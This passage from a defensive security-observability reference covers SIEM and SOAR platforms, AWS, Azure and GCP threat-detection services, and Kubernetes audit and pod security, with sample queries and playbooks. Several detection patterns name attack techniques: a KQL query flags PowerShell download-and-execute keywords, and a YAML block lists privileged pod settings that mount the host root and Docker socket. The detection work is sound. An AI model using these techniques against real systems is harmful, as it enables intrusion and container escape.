- MITRE ATT&CK mapping
- Active response (automated blocking)
- Cloud security monitoring (AWS, Azure, GCP)
- Container security (Docker, Kubernetes)

**Wazuh Rule Example (Brute Force):**
```xml
<group name="authentication_failures,">
  <rule id="100100" level="10" frequency="8" timeframe="120">
    <if_matched_group>authentication_failures</if_matched_group>
    <description>Multiple authentication failures from same source</description>
    <mitre>
      <id>T1110</id>
    </mitre>
  </rule>
</group>
```

**Market Position**: 8.4% SIEM mindshare (2025), #2 in open-source SIEM. Ideal for organizations needing endpoint + SIEM in a single open-source platform.

### Security Onion

**Overview**: Free Linux distribution for threat hunting, network security monitoring (NSM), and log management.

**Integrated Tools:**
| Tool | Function |
|------|----------|
| **Suricata** | Network IDS/IPS (signature-based) |
| **Zeek** | Network metadata analysis (protocol-level) |
| **Wazuh** | Host-based IDS and log analysis |
| **Elasticsearch** | Data storage and search |
| **Kibana** | Visualization and dashboards |
| **CyberChef** | Data decoding and analysis |
| **NetworkMiner** | Network forensic analysis |
| **Strelka** | File analysis engine |

**Best For**: Network-centric SOCs, threat hunters who need packet-level visibility, and organizations that want an all-in-one NSM/SIEM distribution.

**Limitations**: Requires Linux expertise, limited scalability compared to commercial SIEMs, complex multi-node deployments.

### AlienVault OSSIM

**Overview**: Originally by AlienVault (now AT&T Cybersecurity), combines SIEM with asset discovery, vulnerability assessment, and IDS.

**Components:**
- Asset discovery (Nmap-based)
- Vulnerability assessment (OpenVAS integration)
- Intrusion detection (Suricata, OSSEC)
- SIEM correlation (directive-based)
- Log management

**Market Position**: 2.2% mindshare, declining. Interface feels dated, limited scalability, useful for small labs or learning. AT&T's commercial USM Anywhere is the supported successor.

---

## 9. SOAR Architecture and Platforms

### SOAR Fundamentals

Security Orchestration, Automation, and Response (SOAR) platforms automate security operations workflows.

```
+---------------------+
| Trigger             |
| (SIEM Alert, Email, |
|  Webhook, Schedule) |
+---------+-----------+
          |
          v
+---------------------+     +---------------------+
| Playbook Engine     |---->| Integration Layer   |
| - Decision Logic    |     | - 300+ Connectors   |
| - Branching         |     | - REST API Actions  |
| - Loops             |     | - Custom Scripts    |
| - Human Approval    |     | - Webhooks          |
+---------+-----------+     +---------+-----------+
          |                           |
          v                           v
+---------------------+     +---------------------+
| Case Management     |     | Response Actions    |
| - Evidence          |     | - Block IP/Domain   |
| - Timeline          |     | - Disable Account   |
| - Assignments       |     | - Isolate Endpoint  |
| - SLA Tracking      |     | - Create Ticket     |
| - Collaboration     |     | - Enrich IOCs       |
+---------------------+     +---------------------+
```

### Playbook Design Patterns

**Pattern 1: Phishing Triage**
```
Trigger: Email reported as phishing
  |
  +--> Extract indicators (URLs, attachments, sender)
  +--> Check reputation (VirusTotal, URLScan, AbuseIPDB)
  +--> Detonate attachments (sandbox: Any.run, Joe Sandbox)
  +--> Check if sender domain is spoofed (SPF/DKIM/DMARC)
  |
  +--> Decision: Malicious?
       |
       YES --> Block sender domain in email gateway
              Block URLs in proxy/firewall
              Search mailboxes for similar emails
              Remove from all inboxes
              Notify affected users
              Create incident ticket
              Update threat intel platform
       |
       NO  --> Mark as false positive
              Update ML training data
              Close case
```

**Pattern 2: Suspicious Login Enrichment and Containment**
```
Trigger: SIEM alert - impossible travel / risky sign-in
  |
  +--> Enrich user (AD/Entra ID: role, department, manager)
  +--> Enrich IP (GeoIP, ASN, reputation, VPN check)
  +--> Check recent user activity (email, file access, MFA changes)
  +--> Check if IP matches known VPN/corporate egress
  |
  +--> Decision: Risk level?
       |
       HIGH --> Force MFA re-registration
               Revoke active sessions
               Disable account temporarily
               Notify user's manager via Slack/Teams
               Page SOC analyst
               Create P1 incident
       |
       MEDIUM --> Send user verification via Slack/Teams
                  Await response (30 min SLA)
                  If confirmed: close as legitimate
                  If denied: escalate to HIGH
       |
       LOW --> Log enrichment results
              Auto-close with notes
```

**Pattern 3: Malware Containment**
```
Trigger: EDR alert - malware detected on endpoint
  |
  +--> Isolate endpoint from network (EDR action)
  +--> Collect forensic artifacts (memory dump, process list, autoruns)
  +--> Extract IOCs (file hashes, C2 IPs, domains)
  +--> Search across fleet for same IOCs
  |
  +--> Decision: Scope?
       |
       Single host --> Remediate (quarantine file, kill process)
                       Re-scan endpoint
                       Remove from isolation
                       Monitor for 24h
       |
       Multiple hosts --> Escalate to IR team
                          Block C2 at firewall/proxy
                          Push IOCs to all security tools
                          Initiate IR playbook
                          Notify CISO
```

**Pattern 4: Cloud Resource Exposure**
```
Trigger: CSPM alert - public S3 bucket / open security group
  |
  +--> Identify resource owner (tags, CloudTrail creator)
  +--> Check if resource contains sensitive data (Macie/DLP scan)
  +--> Check if change was authorized (change management ticket)
  |
  +--> Decision: Authorized?
       |
       NO  --> Revert configuration (remove public access)
              Notify resource owner
              Create compliance finding
              Update prevention policy
       |
       YES --> Verify compensating controls exist
              Document exception
              Set review reminder
```

### Platform Comparison

| Platform | Vendor | Key Strength | Integrations | Pricing |
|----------|--------|-------------|-------------|---------|
| **Splunk SOAR (Phantom)** | Cisco/Splunk | Deep Splunk integration, 2,800+ actions, Visual Playbook Editor | 300+ apps | $50K-200K+/year |
| **Cortex XSOAR** | Palo Alto Networks | Largest marketplace, War Room collaboration, DevOps-style playbooks | 800+ integrations | $75K-300K+/year |
| **Sentinel Playbooks** | Microsoft | Native Azure/M365, Logic Apps engine, low-code | 400+ Logic Apps connectors | Per-execution ($0.000125/action) |
| **Chronicle SOAR** | Google | Native Chronicle integration, case management | 200+ integrations | Bundled with Chronicle |
| **Tines** | Tines | Clean drag-and-drop, API-first, no-code, fast implementation | Any API (no pre-built limit) | Per-story pricing |
| **Shuffle** | Shuffle (open-source) | Free, open-source, Docker-based, OpenAPI-based apps | OpenAPI-based (unlimited) | Free (self-hosted) |

### SOAR Metrics

| Metric | Definition | Target |
|--------|-----------|--------|
| **Automation Rate** | % of alerts handled without human intervention | 60-80% for L1 |
| **MTTR** (Mean Time to Respond) | Time from alert to containment | < 30 min for P1 |
| **MTTD** (Mean Time to Detect) | Time from compromise to detection | < 24 hours |
| **Analyst Time Saved** | Hours reclaimed by automation per week | 20-40 hrs/analyst/week |
| **Playbook Coverage** | % of alert types with automated playbooks | > 80% |
| **False Positive Rate** | % of automated closures that were correct | > 95% accuracy |
| **Escalation Rate** | % of alerts requiring human review | < 20-30% |

### ChatOps Integration

**Slack/Teams Integration Patterns:**
```
1. Alert Notification Channel
   - Automated posting of P1/P2 alerts
   - Rich formatting with entity details, risk score, MITRE mapping
   - Interactive buttons: Acknowledge, Investigate, Escalate, False Positive

2. Approval Workflows
   - SOAR requests human approval for containment actions
   - Manager approval for account disabling
   - Timeout with auto-escalation

3. War Room Channels
   - Auto-created per major incident
   - Bot posts timeline updates
   - Evidence sharing
   - Runbook steps checklist

4. Status Updates
   - Automated stakeholder updates at intervals
   - Executive summary generation
   - Post-incident review scheduling
```

---

## 10. AWS Security Observability

### AWS CloudTrail

CloudTrail records API activity across your AWS infrastructure.

**Event Types:**

| Event Type | Description | Default | Cost |
|------------|-------------|---------|------|
| **Management Events** | Control plane operations (CreateBucket, RunInstances) | Enabled (free for 1 trail) | Free for management read/write |
| **Data Events** | Data plane operations (S3 GetObject, Lambda Invoke) | Disabled | $0.10 per 100,000 events |
| **Insights Events** | Anomalous API call patterns | Disabled | $0.35 per 100,000 events analyzed |
| **Network Activity Events** | VPC endpoint activity | Disabled (preview) | Varies |

**CloudTrail Lake (SQL Queries):**
```sql
-- Find all IAM role assumption events by external accounts
SELECT
    eventTime, eventName, userIdentity.arn as assumedBy,
    requestParameters.roleArn as roleAssumed,
    sourceIPAddress, userAgent
FROM cloudtrail_logs
WHERE eventName = 'AssumeRole'
    AND userIdentity.accountId != '123456789012'
    AND eventTime > '2025-01-01'
ORDER BY eventTime DESC
LIMIT 100;

-- Find console logins without MFA
SELECT
    eventTime, userIdentity.arn, sourceIPAddress,
    responseElements.ConsoleLogin
FROM cloudtrail_logs
WHERE eventName = 'ConsoleLogin'
    AND additionalEventData LIKE '%"MFAUsed":"No"%'
    AND eventTime > '2025-01-01';

-- S3 bucket policy changes
SELECT
    eventTime, userIdentity.arn, requestParameters.bucketName,
    sourceIPAddress, eventName
FROM cloudtrail_logs
WHERE eventName IN ('PutBucketPolicy', 'DeleteBucketPolicy',
    'PutBucketAcl', 'PutBucketPublicAccessBlock')
    AND eventTime > '2025-01-01'
ORDER BY eventTime DESC;
```

**Organization Trail**: Single trail across all accounts in an AWS Organization, stored in a central S3 bucket with cross-account access.

### AWS GuardDuty

GuardDuty is a threat detection service that continuously monitors for malicious activity.

**Finding Categories and Examples:**

| Category | Finding Type Examples | Severity |
|----------|---------------------|----------|
| **Recon** | `Recon:EC2/PortProbeUnprotectedPort`, `Recon:EC2/Portscan` | Low-Medium |
| **UnauthorizedAccess** | `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`, `UnauthorizedAccess:EC2/RDPBruteForce` | Medium-High |
| **CryptoCurrency** | `CryptoCurrency:EC2/BitcoinTool.B!DNS`, `CryptoCurrency:Runtime/BitcoinTool.B` | High |
| **Trojan** | `Trojan:EC2/BlackholeTraffic`, `Trojan:Runtime/BlackholeTraffic` | High |
| **Stealth** | `Stealth:IAMUser/CloudTrailLoggingDisabled`, `Stealth:IAMUser/PasswordPolicyChange` | Low-High |
| **Impact** | `Impact:EC2/WinRMBruteForce`, `Impact:Runtime/AbusedDomainRequest.Reputation` | Medium-High |
| **Persistence** | `Persistence:IAMUser/UserPermissions`, `Persistence:Runtime/SuspiciousCommand` | Medium |
| **PrivilegeEscalation** | `PrivilegeEscalation:Runtime/DockerSocketAccess` | High |
| **Execution** | `Execution:Runtime/NewBinaryExecuted`, `Execution:Runtime/SuspiciousScript` | Medium-High |
| **CredentialAccess** | `CredentialAccess:Kubernetes/MaliciousIPCaller` | High |
| **DefenseEvasion** | `DefenseEvasion:Runtime/ProcessInjection.VirtualMemoryWrite` | High |

**Protection Plans:**

| Plan | What It Monitors | Findings |
|------|-----------------|----------|
| **Foundational** | CloudTrail management events, VPC Flow Logs, DNS query logs | IAM, network, DNS findings |
| **S3 Protection** | CloudTrail S3 data events | S3 access anomalies, credential exfiltration |
| **EKS Protection** | EKS Kubernetes audit logs | K8s API abuse, privilege escalation |
| **Runtime Monitoring** | OS-level activity on EKS, ECS, EC2 | Process, file, network runtime threats (41 finding types) |
| **Lambda Protection** | Lambda network activity | Suspicious Lambda function behavior |
| **RDS Protection** | RDS login activity | Brute force, anomalous login patterns |
| **Malware Protection** | EBS volume scanning | Malware on EC2/container volumes |

**Extended Threat Detection (2025):**
Multi-stage attack sequences correlated across GuardDuty findings, identifying attack campaigns rather than isolated events.

### AWS Security Hub

Centralized security findings aggregation and compliance monitoring.

**Security Standards:**
| Standard | Controls | Focus |
|----------|----------|-------|
| **AWS Foundational Security Best Practices (FSBP)** | 200+ | AWS-specific security controls |
| **CIS AWS Foundations Benchmark** | 50+ | Industry CIS controls for AWS |
| **PCI DSS** | 130+ | Payment card industry requirements |
| **NIST 800-53** | 200+ | Federal/government security framework |

**Automated Remediation Pattern:**
```
Security Hub Finding --> EventBridge Rule --> Lambda Function --> Remediation
                                                |
                                                +--> SNS Notification
```

Example: Auto-remediate public S3 buckets:
```python
# Lambda function triggered by Security Hub finding
import boto3

def handler(event, context):
    finding = event['detail']['findings'][0]

    if finding['Title'] == 'S3.2 S3 buckets should prohibit public read access':
        bucket_name = finding['Resources'][0]['Id'].split(':')[-1]
        s3 = boto3.client('s3')

        # Block public access
        s3.put_public_access_block(
            Bucket=bucket_name,
            PublicAccessBlockConfiguration={
                'BlockPublicAcls': True,
                'IgnorePublicAcls': True,
                'BlockPublicPolicy': True,
                'RestrictPublicBuckets': True
            }
        )
        return {'status': 'remediated', 'bucket': bucket_name}
```

### AWS Config

Configuration recording and compliance monitoring.

**Key Security Rules:**
```
# Managed rules for common security checks
- s3-bucket-public-read-prohibited
- s3-bucket-ssl-requests-only
- ec2-instance-no-public-ip
- iam-root-access-key-check
- iam-user-mfa-enabled
- rds-instance-public-access-check
- encrypted-volumes
- vpc-flow-logs-enabled
- cloudtrail-enabled
- guardduty-enabled-centralized
- securityhub-enabled
```

**Conformance Packs**: Pre-packaged collections of Config rules mapped to compliance frameworks (CIS, NIST, PCI-DSS, HIPAA).

### AWS Detective

Investigation service that uses graph analysis to understand security findings.

**Capabilities:**
- **Finding Groups**: Automatically groups related GuardDuty findings into potential security incidents
- **Entity Profiling**: Behavioral baselines for IP addresses, EC2 instances, IAM users/roles, Kubernetes resources
- **Investigation Graphs**: Visual representation of entity relationships and activity patterns
- **Security Lake Integration**: Queries raw CloudTrail and VPC Flow Log data from Security Lake

### Amazon Security Lake

Centralized security data lake using the Open Cybersecurity Schema Framework (OCSF).

**Architecture:**
```
+---------------------+                    +-------------------+
| AWS Native Sources  |                    | Third-Party       |
| - CloudTrail        |                    | Sources           |
| - VPC Flow Logs     |     +---------+    | - Okta            |
| - Route 53 DNS      |---->| Security|<---| - CrowdStrike     |
| - Security Hub      |     | Lake    |    | - Palo Alto       |
| - EKS Audit Logs    |     | (OCSF   |    | - Custom (OCSF)   |
| - S3 Access Logs    |     |  Format) |    +-------------------+
+---------------------+     +---------+
                                  |
                    +-------------+------------+
                    |             |             |
              +-----------+ +-----------+ +-----------+
              | Athena    | | Detective | | 3rd Party |
              | (SQL)     | | (Graphs)  | | SIEM      |
              +-----------+ +-----------+ +-----------+
```

**OCSF Event Classes:**
- Authentication (login/logout)
- Account Change (user/role modifications)
- API Activity (control plane operations)
- Network Activity (VPC flows)
- DNS Activity (Route 53 queries)
- File Activity (S3 data events)
- Security Finding (Security Hub, GuardDuty)

**Key Features:**
- Cross-account and cross-region aggregation
- Apache Parquet format (columnar, compressed)
- Subscriber access model for consuming SIEMs
- 7-year retention in CloudTrail Lake at no extra cost
- OCSF v1.1.0 support

### AWS IAM Access Analyzer

**External Access Findings:**
Identifies resources shared with external principals using mathematical logic-based reasoning:
- S3 buckets with public or cross-account access
- IAM roles assumable by external accounts
- KMS keys with cross-account grants
- Lambda functions with external invocation
- SQS queues with cross-account access

**Unused Access Findings (paid):**
- Unused IAM roles (no activity in usage window)
- Unused IAM user credentials (access keys, passwords)
- Unused permissions (service-level and action-level)

**Integration:** Findings sent to Security Hub and EventBridge for automated workflows.

### VPC Flow Logs Security Analysis

```sql
-- Athena query: Find potential port scanning
SELECT srcaddr, dstaddr, dstport, protocol,
    COUNT(*) as connection_attempts,
    COUNT(DISTINCT dstport) as unique_ports,
    COUNT(DISTINCT dstaddr) as unique_destinations
FROM vpc_flow_logs
WHERE action = 'REJECT'
    AND date >= '2025-01-01'
GROUP BY srcaddr, dstaddr, dstport, protocol
HAVING unique_ports > 20
ORDER BY unique_ports DESC;

-- Find data exfiltration candidates (large outbound transfers)
SELECT srcaddr, dstaddr, dstport,
    SUM(bytes) as total_bytes,
    COUNT(*) as flow_count
FROM vpc_flow_logs
WHERE action = 'ACCEPT'
    AND flow_direction = 'egress'
    AND date >= '2025-01-01'
GROUP BY srcaddr, dstaddr, dstport
HAVING total_bytes > 1073741824  -- 1 GB
ORDER BY total_bytes DESC;
```

---

## 11. Azure Security Observability

### Microsoft Defender for Cloud

Unified CSPM and CWP platform for Azure, AWS, and GCP.

**CSPM Capabilities:**

| Feature | Foundational (Free) | Defender CSPM (Paid) |
|---------|-------------------|---------------------|
| **Secure Score** | Basic recommendations | Risk-based scoring with asset criticality |
| **Compliance** | Azure Security Benchmark | Regulatory standards (PCI, NIST, CIS, ISO, SOC) |
| **Attack Path Analysis** | Not available | Graph-based attack path visualization |
| **Cloud Security Graph** | Not available | Explorer for querying resource relationships |
| **Agentless Scanning** | Not available | VM vulnerability scanning without agents |
| **Data-Aware Security** | Not available | Sensitive data discovery and classification |
| **External Attack Surface** | Not available | Defender EASM integration |

**Secure Score**: 0-100 score aggregating all security recommendations weighted by resource criticality and risk exposure. Recommendations are grouped by control (e.g., "Enable MFA", "Apply system updates", "Restrict network access").

**Attack Path Analysis Example:**
```
Internet --> Public Load Balancer --> VM (unpatched CVE-2025-xxxx)
    --> Managed Identity (Contributor role) --> Key Vault (secrets)
    --> Storage Account (sensitive data)

Risk: External attacker could exploit the VM vulnerability,
use the managed identity to access Key Vault secrets,
and exfiltrate data from the storage account.
```

**Cloud Workload Protection Plans:**

| Plan | Protects | Key Features |
|------|----------|-------------|
| **Defender for Servers** | VMs, Arc-connected servers | Vulnerability assessment, FIM, adaptive controls, JIT access |
| **Defender for Containers** | AKS, EKS, GKE | Runtime protection, image scanning, K8s admission control |
| **Defender for Storage** | Blob, Files, Data Lake | Malware scanning, sensitive data detection, anomalous access |
| **Defender for SQL** | Azure SQL, SQL on VMs | Vulnerability assessment, anomalous queries, injection detection |
| **Defender for Key Vault** | Key Vault instances | Unusual access patterns, suspicious IP access, TOR access |
| **Defender for DNS** | DNS queries | DNS tunneling, C2 communication, data exfiltration |
| **Defender for Resource Manager** | ARM operations | Suspicious management operations, lateral movement |
| **Defender for App Service** | Web apps, Functions | Dangling DNS, suspicious files, anomalous requests |
| **Defender for APIs** | API Management | OWASP Top 10 API threats, anomalous usage |

### Entra ID (Azure AD) Security Monitoring

**Log Types:**

| Log | Content | Sentinel Table |
|-----|---------|----------------|
| **Sign-in Logs** | Interactive/non-interactive/service principal sign-ins | `SigninLogs` |
| **Audit Logs** | Directory changes (users, groups, roles, apps) | `AuditLogs` |
| **Provisioning Logs** | User/group provisioning to SaaS apps | `AADProvisioningLogs` |
| **Risky Users** | Users with detected risk indicators | `AADRiskyUsers` |
| **Risky Sign-ins** | Sign-ins with risk detections | `AADRiskySignIns` (also in `SigninLogs`) |
| **Identity Protection** | Risk detection events | `SecurityAlert` |

**Identity Protection Risk Detections:**
- Anonymous IP address usage
- Atypical travel
- Malware-linked IP address
- Unfamiliar sign-in properties
- Password spray
- Leaked credentials (dark web monitoring)
- Token anomaly
- Suspicious browser/inbox rules
- Anomalous token (2025)
- Verified threat actor IP (2025)

**KQL: Risky User Activity Correlation**
```kql
let RiskyUsers = AADRiskyUsers
    | where TimeGenerated > ago(24h)
    | where RiskLevel in ("high", "medium")
    | project UserPrincipalName, RiskLevel, RiskDetail;
let UserActivity = AuditLogs
    | where TimeGenerated > ago(24h)
    | extend Initiator = tostring(InitiatedBy.user.userPrincipalName)
    | where Initiator != "";
RiskyUsers
| join kind=inner (UserActivity) on $left.UserPrincipalName == $right.Initiator
| summarize
    ActivityCount = count(),
    Activities = make_set(OperationName, 20)
    by UserPrincipalName, RiskLevel, RiskDetail
| sort by ActivityCount desc
```

### Azure Policy Compliance Monitoring

```kql
// Non-compliant resources by policy
PolicyStates_CL
| where TimeGenerated > ago(1d)
| where ComplianceState_s == "NonCompliant"
| summarize
    NonCompliantCount = count(),
    Resources = make_set(ResourceId, 10)
    by PolicyDefinitionName_s, PolicyAssignmentName_s
| sort by NonCompliantCount desc
```

### Network Security Group (NSG) Flow Logs

**KQL: Detect Denied Inbound from Known Malicious IPs**
```kql
AzureNetworkAnalytics_CL
| where TimeGenerated > ago(24h)
| where FlowDirection_s == "I" and FlowStatus_s == "D"
| where SubType_s == "FlowLog"
| summarize
    BlockedAttempts = count(),
    TargetPorts = make_set(DestPort_d, 20),
    TargetIPs = make_set(DestIP_s, 10)
    by SrcIP_s
| where BlockedAttempts > 100
| sort by BlockedAttempts desc
```

### Azure Key Vault Security Monitoring

```kql
// Unusual Key Vault access patterns
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where TimeGenerated > ago(7d)
| where OperationName has_any ("SecretGet", "SecretList", "KeyDecrypt")
| summarize
    DailyOps = count(),
    UniqueCallers = dcount(CallerIPAddress),
    UniqueSecrets = dcount(id_s)
    by bin(TimeGenerated, 1d), ResourceId
| extend PrevDayOps = prev(DailyOps, 1)
| where isnotnull(PrevDayOps)
| extend ChangePercent = round(((DailyOps - PrevDayOps) * 100.0 / PrevDayOps), 1)
| where ChangePercent > 200  // 200% increase
```

### Microsoft Defender for Endpoint Integration

Defender for Endpoint telemetry flows into Sentinel via the `DeviceEvents`, `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceFileEvents`, and `DeviceLogonEvents` tables.

```kql
// Detect suspicious PowerShell on endpoints
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any (
    "-enc", "-encodedcommand", "downloadstring",
    "invoke-expression", "bypass", "-noprofile",
    "frombase64string", "invoke-webrequest")
| project TimeGenerated, DeviceName, AccountName,
    ProcessCommandLine, InitiatingProcessFileName
| sort by TimeGenerated desc
```

---

## 12. GCP Security Observability

### Security Command Center (SCC)

**Tier Comparison:**

| Feature | Standard (Free) | Premium | Enterprise |
|---------|----------------|---------|------------|
| **Vulnerability Scanning** | Web Security Scanner | + VM Manager vulns | + Agentless scanning |
| **Security Health Analytics** | Basic | 140+ detectors | All detectors |
| **Event Threat Detection** | No | Yes | Yes |
| **Container Threat Detection** | No | Yes | Yes |
| **VM Threat Detection** | No | Yes | Yes |
| **Attack Path Simulation** | No | No | Yes |
| **Toxic Combinations** | No | No | Yes |
| **SIEM (Chronicle)** | No | No | Integrated |
| **SOAR** | No | No | Integrated |
| **Mandiant Threat Intel** | No | No | Yes |
| **Pricing** | Free | Per-resource | Per-workload + data |

### Event Threat Detection Findings

| Finding Category | Examples |
|-----------------|----------|
| **Credential Access** | Compromised service account key, leaked credentials |
| **Evasion** | Logging disabled, monitoring disabled, VPC Service Controls breach |
| **Exfiltration** | BigQuery data exfiltration, Cloud Storage data exfiltration |
| **IAM Abuse** | Anomalous IAM grants, service account self-investigation |
| **Malware** | Malicious script execution, cryptomining |
| **Persistence** | New service account key creation, IAM binding anomalies |
| **Brute Force** | SSH brute force, excessive authentication failures |

### Container Threat Detection

Detects runtime threats in GKE containers using kernel-level instrumentation:

| Finding Type | Description |
|-------------|-------------|
| **Added Binary Executed** | Newly added binary executed in container |
| **Added Library Loaded** | Newly added library loaded in container |
| **Execution: Added Malicious Binary Executed** | Known malicious binary |
| **Execution: Modified Malicious Binary Executed** | Modified known malicious binary |
| **Reverse Shell** | Process with stream redirection to remote socket |
| **Unexpected Child Shell** | Process spawned unexpected shell |
| **Malicious Script Executed** | ML-detected malicious script |
| **Malicious URL Observed** | Known malicious URL in process arguments |

### VM Threat Detection

Hypervisor-level threat detection (no agent required):

| Finding Type | Description |
|-------------|-------------|
| **Execution: Cryptocurrency Mining Hash Match** | Known mining binary hashes |
| **Execution: Cryptocurrency Mining YARA Rule** | Mining pattern detection |
| **Execution: Cryptocurrency Mining Combined Detection** | Multi-signal mining detection |
| **Rootkit** | Known kernel rootkit signatures |
| **Defense Evasion: Unexpected Kernel Code Modification** | Kernel integrity violation |
| **Defense Evasion: Unexpected Kernel Read-Only Data Modification** | Kernel data tampering |

### Cloud Audit Logs

| Log Type | Content | Always Enabled | Cost |
|----------|---------|---------------|------|
| **Admin Activity** | Config/metadata changes | Yes (cannot disable) | Free |
| **Data Access** | Data read/write operations | No (must enable) | Charged per volume |
| **System Event** | Google-generated system actions | Yes | Free |
| **Policy Denied** | Denied access due to security policy | Yes | Free |

**Key Audit Log Queries (Cloud Logging):**
```
-- Detect IAM policy changes
resource.type="project"
protoPayload.methodName="SetIamPolicy"
protoPayload.serviceData.policyDelta.bindingDeltas.action="ADD"

-- Detect service account key creation
protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"

-- Detect firewall rule changes
resource.type="gce_firewall_rule"
protoPayload.methodName="v1.compute.firewalls.insert" OR
protoPayload.methodName="v1.compute.firewalls.patch"

-- Detect VPC Service Controls violations
protoPayload.metadata.@type="type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata"
protoPayload.metadata.violationReason!=""
```

### VPC Service Controls Monitoring

VPC Service Controls create security perimeters around GCP resources. Monitoring includes:
- **Dry-run violations**: Test policy without enforcement
- **Enforced violations**: Blocked requests crossing perimeter boundaries
- **Ingress/Egress violations**: Cross-perimeter data movement attempts

### Binary Authorization

Ensures only trusted container images are deployed to GKE:

```yaml
# Binary Authorization Policy
apiVersion: binaryauthorization.googleapis.com/v1
kind: Policy
defaultAdmissionRule:
  evaluationMode: REQUIRE_ATTESTATION
  enforcementMode: ENFORCED_BLOCK_AND_AUDIT_LOG
  requireAttestationsBy:
    - projects/my-project/attestors/build-attestor
    - projects/my-project/attestors/security-scan-attestor
clusterAdmissionRules:
  # Allow any image in dev clusters
  us-central1-a.dev-cluster:
    evaluationMode: ALWAYS_ALLOW
    enforcementMode: DRYRUN_AUDIT_LOG_ONLY
```

### Google Cloud Armor WAF Logs

Cloud Armor provides WAF protection for global external Application Load Balancers:

```
-- Cloud Logging: Blocked WAF requests
resource.type="http_load_balancer"
jsonPayload.enforcedSecurityPolicy.configuredAction="DENY"

-- OWASP Top 10 detections
resource.type="http_load_balancer"
jsonPayload.enforcedSecurityPolicy.preconfiguredExprRulesEvaluated.matchedExprIds!=""
```

**Pre-configured WAF Rules:**
- SQL injection (SQLi)
- Cross-site scripting (XSS)
- Local file inclusion (LFI)
- Remote file inclusion (RFI)
- Remote code execution (RCE)
- Method enforcement
- Scanner detection
- Protocol attack
- PHP injection
- Session fixation

---

## 13. Container and Kubernetes Security Observability

### Kubernetes Audit Logs

The Kubernetes API server generates audit logs for all API requests.

**Audit Policy Levels:**
| Level | What is Logged |
|-------|---------------|
| **None** | Nothing logged |
| **Metadata** | Request metadata (user, timestamp, resource, verb) but no body |
| **Request** | Metadata + request body |
| **RequestResponse** | Metadata + request body + response body |

**Audit Policy Example:**
```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # Log all authentication at RequestResponse level
  - level: RequestResponse
    resources:
      - group: "authentication.k8s.io"
        resources: ["tokenreviews"]

  # Log secrets access at Metadata level (never log secret values)
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets"]

  # Log role/clusterrole changes at RequestResponse
  - level: RequestResponse
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]

  # Log pod exec/attach/port-forward
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach", "pods/portforward"]

  # Log node and namespace changes
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["nodes", "namespaces"]

  # Log everything else at Metadata level
  - level: Metadata
    omitStages:
      - "RequestReceived"
```

**Key Fields for Security Analysis:**
```json
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "RequestResponse",
  "auditID": "unique-id",
  "stage": "ResponseComplete",
  "requestURI": "/api/v1/namespaces/default/pods/web-app/exec",
  "verb": "create",
  "user": {
    "username": "system:serviceaccount:default:deploy-bot",
    "groups": ["system:serviceaccounts"]
  },
  "sourceIPs": ["10.0.1.50"],
  "objectRef": {
    "resource": "pods",
    "subresource": "exec",
    "namespace": "default",
    "name": "web-app"
  },
  "responseStatus": {
    "code": 200
  }
}
```

**Security-Relevant Audit Events to Monitor:**
| Event | Verb | Resource | Risk |
|-------|------|----------|------|
| Pod exec/attach | create | pods/exec, pods/attach | Container shell access |
| Secret access | get, list | secrets | Credential theft |
| ClusterRole binding | create, update | clusterrolebindings | Privilege escalation |
| Service account token | create | serviceaccounts/token | Identity theft |
| Node proxy | create | nodes/proxy | Host access |
| Privileged pod | create | pods (with securityContext.privileged) | Container escape risk |
| Namespace deletion | delete | namespaces | Denial of service |

### RBAC Monitoring

**KQL (Sentinel) - RBAC Changes in AKS:**
```kql
AzureDiagnostics
| where Category == "kube-audit"
| where log_s has_any ("clusterrolebindings", "rolebindings", "clusterroles", "roles")
| extend AuditLog = parse_json(log_s)
| where AuditLog.verb in ("create", "update", "patch", "delete")
| extend
    User = tostring(AuditLog.user.username),
    Resource = tostring(AuditLog.objectRef.resource),
    Name = tostring(AuditLog.objectRef.name),
    Namespace = tostring(AuditLog.objectRef.namespace),
    Verb = tostring(AuditLog.verb)
| project TimeGenerated, User, Verb, Resource, Name, Namespace
| sort by TimeGenerated desc
```

**Critical RBAC Events:**
- ClusterRoleBinding to `cluster-admin` role
- RoleBinding with wildcard permissions (`*` on resources or verbs)
- Service account given cross-namespace access
- Anonymous user access enabled
- Default service account given non-default permissions

### Pod Security Monitoring

**Pod Security Standards (PSS):**
| Profile | Restrictions |
|---------|-------------|
| **Privileged** | Unrestricted (for system-level pods) |
| **Baseline** | Prevents known privilege escalations (no privileged, no hostNetwork, no hostPID) |
| **Restricted** | Heavily restricted (must run as non-root, drop all capabilities, read-only rootfs) |

**Pod Security Admission Labels:**
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Suspicious Pod Configurations to Monitor:**
```yaml
# HIGH RISK indicators in pod specs:
securityContext:
  privileged: true           # Full host access
  runAsUser: 0               # Running as root
  allowPrivilegeEscalation: true
hostNetwork: true             # Access to host network stack
hostPID: true                 # Access to host process tree
hostIPC: true                 # Access to host IPC
volumes:
  - hostPath:
      path: /                 # Mount entire host filesystem
    name: host-root
  - hostPath:
      path: /var/run/docker.sock  # Docker socket access
    name: docker-socket
```

### Container Image Scanning

**Tool Comparison:**

| Tool | Type | CVE DB | Unique Features | Integration |
|------|------|--------|----------------|-------------|
| **Trivy** | Open source (Aqua) | NVD, GHSA, Red Hat, etc. | Misconfig + secrets + SBOM + IaC scanning | CI/CD, K8s Operator, IDE |
| **Grype** | Open source (Anchore) | NVD, GHSA | Fast, lightweight, focused on CVEs | CI/CD, GitHub Actions |
| **Snyk Container** | Commercial | Snyk DB + NVD | Base image recommendations, developer-first | IDE, SCM, CI/CD, registries |
